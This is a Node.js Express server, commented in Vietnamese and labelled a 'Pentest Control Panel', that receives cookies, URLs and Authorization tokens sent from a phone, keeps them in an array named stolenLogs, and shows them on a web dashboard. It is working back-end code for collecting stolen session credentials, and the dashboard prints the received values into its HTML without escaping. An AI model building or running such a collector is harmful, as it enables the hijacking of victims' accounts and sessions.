const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Mảng lưu trữ các log thu thập được
let stolenLogs = [];

// 1. Nhận dữ liệu Cookie/Token từ điện thoại gửi về (Phương thức POST lên trang chủ)
app.post('/', (req, res) => {
    const { url, cookie, token } = req.body;
    
    console.log(`[${new Date().toLocaleTimeString()}] Nhận dữ liệu từ URL: ${url}`);

    stolenLogs.push({
        time: new Date().toLocaleString(),
        url: url || 'Không rõ URL',
        cookie: cookie || null,
        token: token || null
    });

    if (stolenLogs.length > 100) {
        stolenLogs.shift();
    }

    res.status(200).json({ status: "success" });
});

// 2. Hiển thị giao diện theo dõi trên trình duyệt (Phương thức GET vào trang chủ)
app.get('/', (req, res) => {
    let logRows = '';
    
    if (stolenLogs.length === 0) {
        logRows = `<tr><td colspan="4" style="text-align:center; padding: 20px; color: #888;">Chưa nhận được dữ liệu nào... Hoạt động ứng dụng trên điện thoại để test.</td></tr>`;
    } else {
        stolenLogs.slice().reverse().forEach((log) => {
            logRows += `
                <tr style="border-bottom: 1px solid #ddd;">
                    <td style="padding: 12px; color: #666; font-size: 14px;">${log.time}</td>
                    <td style="padding: 12px; font-weight: bold; color: #007bff; word-break: break-all;">${log.url}</td>
                    <td style="padding: 12px; background: #fdf5e6;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all; font-family: monospace;">${log.cookie || '<span style="color:red">Không có</span>'}</pre></td>
                    <td style="padding: 12px; background: #eef9ff;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all; font-family: monospace;">${log.token || '<span style="color:red">Không có</span>'}</pre></td>
                </tr>
            `;
        });
    }

    res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <title>Pentest Control Panel</title>
    </head>
    <body style="font-family: system-ui, -apple-system, sans-serif; margin: 30px; background-color: #f8f9fa;">
        <h2 style="color: #333; border-bottom: 2px solid #333; padding-bottom: 10px;">🛡️ Máy Chủ Thử Nghiệm Thu Thập Dữ Liệu (Pentest Logs)</h2>
        <p>Hệ thống tự động cập nhật khi bạn reload trang này.</p>
        <table style="width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-radius: 8px; overflow: hidden;">
            <thead>
                <tr style="background-color: #343a40; color: white; text-align: left;">
                    <th style="padding: 12px; width: 15%;">Thời gian</th>
                    <th style="padding: 12px; width: 25%;">Ứng dụng / URL</th>
                    <th style="padding: 12px; width: 30%;">Cookie</th>
                    <th style="padding: 12px; width: 30%;">Token (Authorization)</th>
                </tr>
            </thead>
            <tbody>
                ${logRows}
            </tbody>
        </table>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server hoạt động đồng bộ tại cổng ${PORT}`);
});
